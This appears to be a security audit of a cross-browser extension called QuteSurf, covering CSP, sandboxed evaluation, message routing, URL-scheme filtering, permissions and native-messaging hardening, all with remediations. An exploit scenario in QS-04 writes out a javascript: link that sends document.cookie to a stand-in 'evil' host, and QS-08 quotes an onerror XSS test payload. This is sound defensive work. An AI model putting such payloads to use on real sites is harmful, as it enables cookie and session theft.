# QuteSurf Security Audit

**Date:** 2026-06-14
**Scope:** Full extension — `src/` (core, content_scripts, background, profiles, commands, pages, nvim), manifests in `config/`, native messaging host in `native-host/`.
**Manifest:** V3, cross-browser (Chrome + Firefox).
**Threat model:** malicious/compromised web pages, attacker-controlled data flowing through the extension (page titles, URLs, history/bookmark entries, clipboard, anchor text), privilege escalation across the content↔background trust boundary, the native-messaging boundary, and supply chain.

---

## Summary table

| ID | Title | Severity | Status |
|----|-------|----------|--------|
| QS-01 | Arbitrary user JS evaluated via `new Function` in privileged extension page (would require `unsafe-eval`) | Critical | **Resolved** |
| QS-02 | No explicit Content-Security-Policy on extension pages | High | **Resolved** |
| QS-03 | Message router did not enforce command `context` (content-only handlers invocable from background router) | High | **Resolved** |
| QS-04 | Dangerous-scheme navigation (`javascript:`/`data:`/`vbscript:`/`file:`) via omnibar, paste-and-go, hints, and background `tab-new`/`download-url` | High | **Resolved** |
| QS-05 | Over-broad `web_accessible_resources` (`pages/*`, `icons/*`, `chunks/*` to `<all_urls>`) — fingerprinting/clickjacking surface | Medium | **Resolved** |
| QS-06 | Unused powerful permissions (`scripting`, `topSites`) | Medium | **Resolved** |
| QS-07 | Native messaging host: no frame-size cap / structural validation; decode error could wedge the host | Medium | **Resolved** |
| QS-08 | DOM rendering of untrusted strings in omnibar / help / hints / statusline / which-key / find | Medium | **Resolved** (verified safe; regression tests added) |
| QS-09 | ReDoS via user-supplied find regex and `globToRegExp` | Low | **Accepted (with justification)** |
| QS-10 | Prototype-pollution surface in config/options merge of stored JSON | Low | **Accepted (with justification)** |
| QS-11 | `clipboardRead` + `<all_urls>` are broad but required | Info | **Accepted (documented)** |

---

## Findings

### QS-01 — Arbitrary user JS evaluated via `new Function` in a privileged page — **Critical**

**Location:** `src/pages/options.js` (former `_inlineEvaluate`, ~lines 208–245), `src/core/js-settings.js:122–134`.

**Description:** The options page evaluated user-authored "JS settings" with `new Function(...keys, code)` *inside the privileged extension page* (which has `chrome.*`, `chrome.storage`, and the extension origin). To run, this requires `'unsafe-eval'` in the extension-pages CSP. An `unsafe-eval` extension page turns any HTML-injection bug on that page into full extension-privilege RCE, and is also rejected by Chrome Web Store review.

**Exploit scenario:** If any string rendered into the options/help page were ever mis-escaped (or a future bug introduced an injection), `unsafe-eval` allows the injected markup to bootstrap arbitrary script with extension privileges (storage exfiltration, tab control, proxy reconfiguration, native-messaging access).

**Remediation (Resolved):** User JS is no longer evaluated in the privileged page. A dedicated sandboxed page `src/pages/sandbox.html` + `src/pages/sandbox.js` runs the code:
- Declared under the Chrome manifest `"sandbox": { "pages": ["pages/sandbox.html"] }` key → opaque/null origin, **no** `chrome.*` access.
- Loaded by the options page in an `<iframe sandbox="allow-scripts">` (note: **no** `allow-same-origin`) so it is opaque-origin on both Chrome and Firefox.
- `'unsafe-eval'` is granted **only** by the `content_security_policy.sandbox` directive, scoped to that frame; the main `extension_pages` CSP is strict `script-src 'self'`.
- Communication is `postMessage` only; the privileged page sends source code and receives back a structured list of mutations (binds/options/aliases) — no functions or live objects cross the boundary. The options-page listener verifies `event.source === sandboxFrame.contentWindow` and a 5 s timeout guards against a hung frame.

`src/core/js-settings.js` keeps its pure, unit-tested `createSettingsApi`/`evaluateSettings` (still used by tests); the doc comment notes the production path is the sandbox.

---

### QS-02 — No explicit Content-Security-Policy — **High**

**Location:** `config/manifest.chrome.json`, `config/manifest.firefox.json`.

**Description:** Neither manifest set `content_security_policy`. MV3 has a reasonable default, but relying on the default is fragile and leaves no defense-in-depth declaration; it also did not declare a sandbox CSP needed for QS-01.

**Remediation (Resolved):** Added to both manifests:
```
"extension_pages": "script-src 'self'; object-src 'self'; base-uri 'none'"
```
Chrome additionally gets:
```
"sandbox": "sandbox allow-scripts; script-src 'self' 'unsafe-eval'; object-src 'none'; child-src 'none'"
```
No `unsafe-eval` and no remote script on the privileged pages. All HTML pages (`options/help/popup`) already use external `<script src>` (no inline scripts/handlers), so the strict CSP does not break them.

---

### QS-03 — Router did not enforce command context — **High**

**Location:** `src/background/index.js` `makeRouter`.

**Description:** The background message router looked up any command by name and invoked its handler, regardless of the command's declared `context`. Content-context commands (and commands with an unknown/missing context) were therefore invocable through the background router. Combined with `chrome.runtime.onMessage` (which any content script — and via messaging, ultimately page-influenced flows — can reach), this widened the attack surface of the content↔background trust boundary.

**Exploit scenario:** A compromised content script sends `{type:'command', name:'<content-only handler>'}` and triggers a handler never intended to run with background privileges / sender context.

**Remediation (Resolved):** The router now rejects any command whose `cmd.context !== 'background'` with `ok:false`. Regression tests assert a content-context command and a context-less command are both refused and their handlers never called (`tests/background/router.test.js`).

---

### QS-04 — Dangerous-scheme navigation — **High**

**Location:** `src/content_scripts/ui/omnibar.js` `_openUrl`; `src/commands/yank-commands.js` `resolveUrl` (paste-and-go); `src/content_scripts/hints.js` `executeAction` (newtab/images/download); `src/background/tabs.js` `tab-new`; `src/background/downloads.js` `download-url`.

**Description:** Attacker-influenceable strings (a `javascript:`/`data:` bookmark or history URL, a malicious anchor `href` followed via hints, pasted clipboard contents, or any URL forwarded to background `tab-new`/`download-url`) could be turned into a navigation/open/download. Navigating to `javascript:`/`data:`/`vbscript:` can execute script; `file:`/`blob:` can disclose local content.

**Exploit scenario:** A page sets `<a href="javascript:fetch('//evil/?c='+document.cookie)">`; the user opens it via hint-newtab, or a `javascript:` history entry is selected in the omnibar. A compromised content script posts `tab-new` with a `data:text/html` payload.

**Remediation (Resolved):** Added central allowlist helper `src/core/url-safety.js` `isSafeNavUrl()` (allow `http/https/ftp/mailto/about` and scheme-less strings; reject `javascript/data/vbscript/blob/file/filesystem` and any other scheme). Enforced it at every navigation sink:
- Omnibar `_openUrl` returns early on unsafe scheme.
- paste-and-go `resolveUrl` routes unsafe input to a search query instead of navigating.
- Hints `newtab`/`images`/`download` skip unsafe hrefs (in-place `click()` for `follow`/`multi` is left as-is — equivalent to a normal user click and not an extension-initiated new navigation).
- **Authoritative** background checks in `tab-new` and `download-url` throw on unsafe schemes — these are the real trust boundary since a compromised content script could bypass the content-side checks.

Regression tests: `tests/core/url-safety.test.js`, `tests/commands/yank-paste-scheme.test.js`.

---

### QS-05 — Over-broad `web_accessible_resources` — **Medium**

**Location:** both manifests `web_accessible_resources`.

**Description:** Exposing `pages/*`, `icons/*`, `chunks/*` to `<all_urls>` lets any page probe the full set of bundled resources (fingerprinting the extension/version) and frame internal pages (clickjacking). The options/popup/sandbox pages do not need to be web-accessible.

**Remediation (Resolved):** Narrowed to exactly what content opens: `pages/help.html` (+ its css/js) and `chunks/*` (the lazily-loaded ACE editor chunk). Removed `icons/*` and the wildcard `pages/*`. On Chrome, `use_dynamic_url: true` rotates the resource URL per session to further hamper fingerprinting (Firefox ignores this key gracefully). The sandbox page is intentionally **not** web-accessible (it is loaded same-extension by the options page).

---

### QS-06 — Unused powerful permissions — **Medium**

**Location:** both manifests `permissions`.

**Description:** `scripting` and `topSites` were requested but never used anywhere in `src/` (verified by grep). Userscript injection uses a page-world `<script>` element, not `chrome.scripting`. Unused permissions inflate the trust the extension demands and the review/abuse surface.

**Remediation (Resolved):** Removed `scripting` and `topSites` from both manifests. Remaining permissions are each justified in the section below.

---

### QS-07 — Native messaging host hardening — **Medium**

**Location:** `native-host/host.js`, `src/nvim/framing.js`.

**Description:** The host never shells out (no `exec`, no `spawn` with `shell:true` — the documented future nvim integration uses an args array), so command injection is not present. However the decoder accepted an arbitrary 4-byte length header with no upper bound (memory-exhaustion / DoS via a malformed/huge frame) and the host did not validate message structure; a thrown decode error would propagate out of the `readable` handler.

**Remediation (Resolved):**
- `framing.js` now rejects any declared frame length above a 64 MiB ceiling (`MAX_FRAME_BYTES`) with a `RangeError` before slicing/allocating.
- `host.js` wraps `decodeMessages` in try/catch, replies with a protocol error and resets the buffer instead of wedging, and validates that each message is a plain object with a string `type` before handling.

Regression test: oversized-frame rejection in `tests/nvim/framing.test.js`. The README integration note explicitly reiterates "args array, never shell".

---

### QS-08 — DOM rendering of untrusted strings — **Medium** (verified safe)

**Location:** `src/content_scripts/ui/omnibar.js`, `src/pages/help.js`, `src/content_scripts/hints.js`, `statusline.js`, `whichkey.js`, `find.js`.

**Description / audit result:** Every place that renders attacker-influenceable text was reviewed:
- **statusline, which-key, hints labels, find `<mark>`:** use `textContent` / `document.createTextNode` exclusively — inert.
- **omnibar:** the title is the only `innerHTML` sink (`_highlightHtml`). It HTML-escapes (`_escHtml`) every text slice **before** concatenation and inserts only fixed `<span class="qs-omni-hl">` wrappers by index; the favicon `<img>.src` is built solely from `new URL(url).hostname` against Google's s2 favicon service (hostname only). Verified no unescaped substring reaches `innerHTML`.
- **help page:** `highlightText` escapes the text first, then runs a regex built from a **double-escaped** (HTML + regex) query against the already-escaped text, inserting only `<mark>`/`<kbd>` — no path reaches `innerHTML` with unescaped untrusted data.

No code change was required for correctness, but **regression tests were added** (`tests/content/omnibar-xss.test.js`) asserting that a malicious `<img src=x onerror=…>` title renders inert (no real `<img>` element, no `onerror`, payload appears as escaped text) and that highlight ranges still escape the matched substring.

---

### QS-09 — ReDoS in user-supplied regex — **Low** — **Accepted (with justification)**

**Location:** `src/content_scripts/find.js` `buildQuery` (regex find mode); `src/core/userscripts.js` `globToRegExp`.

**Description:** When the user enables regex find, the pattern is the user's own input compiled with `new RegExp`. `globToRegExp` compiles `@match` globs from user-authored userscript metadata. A pathological pattern could cause catastrophic backtracking.

**Justification for acceptance:** Both inputs are **user-authored locally** (the find bar the user is typing into; userscript globs the user installed), not page- or attacker-supplied. A self-inflicted slow regex only affects the user's own tab and cannot be triggered by a remote page. Adding a regex-complexity limiter would add complexity for negligible threat-model benefit. Non-regex find (the default) already escapes all metacharacters.

---

### QS-10 — Prototype-pollution surface in stored-config merge — **Low** — **Accepted (with justification)**

**Location:** `src/core/config.js` `load`, `src/pages/options.js` `loadState`/save, `help.js` merge.

**Description:** Stored config is `JSON.parse`d and merged with `Object.assign`/spread. `JSON.parse` itself cannot create a real `__proto__` accessor (it produces an own data property named `__proto__`), and `Object.assign` copies own enumerable properties without walking the prototype, so classic `__proto__` pollution does not occur here. Bindings are addressed as `bindings[mode][seq]` where `mode`/`seq` originate from user-authored settings.

**Justification for acceptance:** The stored config is written only by this extension's own privileged pages (options/popup) and by the sandboxed evaluator's structured mutations — it is not directly attacker-controlled. The `JSON.parse` + `Object.assign` pattern is not a pollution sink in the standard engine semantics. No cheap, behavior-preserving hardening is warranted; flagged for awareness if a future code path ever parses page-supplied config.

---

### QS-11 — `clipboardRead` and `<all_urls>` breadth — **Info** — **Accepted (documented)**

See "Permissions justification" below. Both are required for core functionality and are justified rather than removed.

---

## Permissions justification (least privilege)

After QS-06, the requested permissions are:

| Permission | Why it is needed | Notes / scoping |
|------------|------------------|-----------------|
| `tabs` | Tab commands (new/close/move/activate/list) and the omnibar tabs source. | Core navigation feature. |
| `bookmarks` | `bookmark-search` for the omnibar bookmarks source. | Read/search only in current code. |
| `history` | `history-search` for the omnibar history source. | Read/search only. |
| `storage` | Persist config, profile, user bindings, userscripts, proxy state. | `chrome.storage.local`. |
| `clipboardWrite` | yank commands copy URL/title/markdown/selection. | — |
| `clipboardRead` | **paste-and-go** reads the clipboard to navigate/search. Powerful, but the feature is a core qutebrowser/SurfingKeys behavior and pasted content is now scheme-filtered (QS-04). | Justified, kept. |
| `downloads` | hint-download and `download-url`; now scheme-checked. | — |
| `sessions` | `tab-undo` (reopen closed tab) and session save/load/list. | — |
| `proxy` | proxy-set/clear/toggle via a generated PAC script (PAC strings are escaped in `proxy.js`). | — |
| `nativeMessaging` | optional Neovim editing host (`connectNative('com.qutesurf.nvim')`), with ACE fallback. | Host hardened (QS-07). |
| `host_permissions: <all_urls>` | The whole point is keyboard navigation on **every** site; the content script matches `<all_urls>` and needs host access to operate (hints, scroll, find, yank) everywhere. | Inherent to the product; cannot be scoped without crippling it. |

Removed: `scripting`, `topSites` (unused).

---

## Userscript trust model (documented)

`src/content_scripts/userscripts.js` injects userscript bodies into the **page world** via a `<script>` element. This is by design (Greasemonkey-style) and runs with page privileges, not extension privileges. The trust model, verified:
- Scripts are sourced **only** from local extension config (`UserscriptStore` → `chrome.storage`), authored by the user. They are never read from page-controlled input.
- `@match`/`@exclude` glob filtering (`matchScripts` + `globToRegExp`) is enforced in `getMatching(url)` **before** injection.
- Injection is triggered only by the content-script bootstrap for the current `location.href`; a page cannot cause an arbitrary script to be injected, nor inject into other origins (the content script and store are per-document).
- Because injected code runs in the page world, it cannot reach `chrome.*` or escalate to extension privileges.

Residual: a user who installs a malicious userscript harms only their own page sessions — equivalent to any userscript manager and outside this threat model.

---

## Test & build verification

- `npm test`: **37 suites / 121 tests passing** (12 new security tests: url-safety, paste scheme rejection, router context enforcement, omnibar XSS inertness, oversized native frame).
- `npm run build`: **both Chrome and Firefox targets build clean** (only the pre-existing ACE chunk size warning). `dist/<target>/pages/sandbox.html` + `sandbox.js` are emitted and the manifests carry the new CSP / sandbox / tightened WAR / reduced permissions.

## Residual / Accepted risks

- **QS-09 (ReDoS):** user-local input only; accepted.
- **QS-10 (proto-pollution):** not a sink under standard semantics; config is extension-written; accepted.
- **Firefox sandbox eval:** Firefox has no manifest `sandbox` key; the design relies on the `<iframe sandbox="allow-scripts">` opaque-origin frame to host the evaluator. The strict `extension_pages` CSP keeps the privileged Firefox pages eval-free; the sandboxed-frame evaluation path is the same code as Chrome. This is the standard cross-browser pattern; flagged for re-verification on each major Firefox release.
- **`<all_urls>` host access:** inherent to an everywhere-keyboard-navigation extension; cannot be reduced without removing the core feature.
